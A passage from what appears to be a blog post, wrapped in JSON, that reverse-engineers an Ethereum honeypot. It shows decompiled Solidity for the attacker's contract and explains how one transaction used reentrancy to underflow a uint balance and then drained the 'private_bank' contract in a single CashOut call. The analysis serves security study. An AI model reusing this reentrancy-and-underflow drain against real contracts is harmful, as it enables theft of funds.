address(this).balance;        doExploit = false;        bank.call(abi.encodeWithSignature(\"Deposit()\", _val));        doExploit = true;        bank.call(abi.encodeWithSignature(\"CashOut(uint256)\", _val));        bank.call(abi.encodeWithSignature(\"CashOut(uint256)\",            bank.balance));        require(address(this).balance >= oldBalance);    }    // function selector: 0x2fac8979    // code entrance: 01fa    function promoteOwner() public {        if (msg.sender == ownerNext) {            owner = ownerNext;        }    }    // function selector: 0x4b906714    // code entrance: 020f    function runCall(address _addr, uint256 _val, bytes memory _data)        public payable onlyOwner {        (bool success,) = _addr.call.value(_val)(abi.encode(_data));        if(!success) {            revert();        }    }    // function selector: 0x529334a1    // code entrance: 02de    function setBank(address _addr) public onlyOwner {        bank = _addr;    }    // function selector: 0x9003e39a    // code entrance: 036c    function runDelegateCall(address _addr, bytes memory _data)        public payable onlyOwner {        (bool success,) = _addr.delegatecall(abi.encode(_data));        if(!success) {            revert();        }    }    // function selector: 0x90a68455    // code entrance: 03dd    function setNextOwner(address _addr) public onlyOwner {        ownerNext = _addr;    }    // function selector: 0xbe9474bb    // code entrance: 0416    function setBuddyStatus(address _addr, bool _flag)        public onlyOwner {        buddyPool[_addr] = _flag;    }    // function selector: 0xc144811f    // code entrance: 045a    function withdraw() public payable onlyOwner {        msg.sender.transfer(address(this).balance);    }}Clearly, there are many overlaps in functionalities between contract f868 and contract abb4, indicating that the honeypot creator reused code as much as possible.The function invoked by transaction 9d19 is that one with selector 0x1190a88a, which is the function clearBank() in the contract given above. The parameter provided to the function is the amount of fund to deposit (that is 1.0001 Ethers). The function first calls the Deposit() function of the private_bank contract to deposit the Ethers. It then invokes the CashOut() function of the private_bank contract twice. In the first invocation, the function launches the reentrance attack, but uses variable \u201cdoExploit\u201d to control the depth of the reentries to be 2.Also, in the reentry initiated in the fallback function, the amount of funds to withdraw is only 1 Wei. After that, the variable \u201cdoExploit\u201d is set to be false, implying that the second call to CashOut() is simply a normal function call without causing any reentrance.In the second call to the CashOut() function, the invoker in fact requests to transfer all the balance in the private_bank contract to contract abb4. It is quite surprised at the first thought why this function call can be successful because the invoker only deposits 1.0001 Ethers and after the first reentrance attack, the invoker already withdraw (1.0001 Ethers + 1 Wei), and the balance of the invoker should be reset to 0. Therefore, the second call to CashOut() function should not be successful. The results of the transaction 9d19 showed that the second call to CashOut() indeed succeeded and the invoker did gain 2.400000346762534399 Ethers.The reason is quite simple: the invoker first deposits 1.0001 Ethers to the private_bank contract, so, the balance of the invoker is 1.0001 Ethers. The invoker then calls CashOut() function to start the reentrance attack and totally pulled (1.0001 Ethers + 1 Wei). At the end of this first CashOut() call, the balance of the invoker becomes ((1.0001- 1.0001) Ethers -1 Wei) = -1 Wei. Because balance is treated as uint in private_bank contract, -1 will be considered as the largest number in uint. Therefore, the second call to CashOut() is successful as the total balance of the contract (which is 2.400000346762534399 Ethers in this case) definitely is smaller than the largest positive number.It is interesting that the honeypot creator does not use reentrance vulnerability to drain all funds from private_bank contract, instead, the creator first utilizes the reentrance attack to cause underflow vulnerability, and then drain all funds with a single function call to CashOut(). When the amount of funds in private_bank contract is small, the difference of the effect by both reentrance attack and underflow attack may not be significant. However, if the amount of funds to drain is huge, the method used by the honeypot creator \u2014 first reentrance attack and then underflow attack \u2014 is much effective because it avoid the lengthy loop of reentrance.", "responses": 0, "tags": ["Smart Contract Honeypot", "Reentrance Vulnerability", "Reverse Engineering", "Ethereum Blockchain", "Cryptosecurity"]}]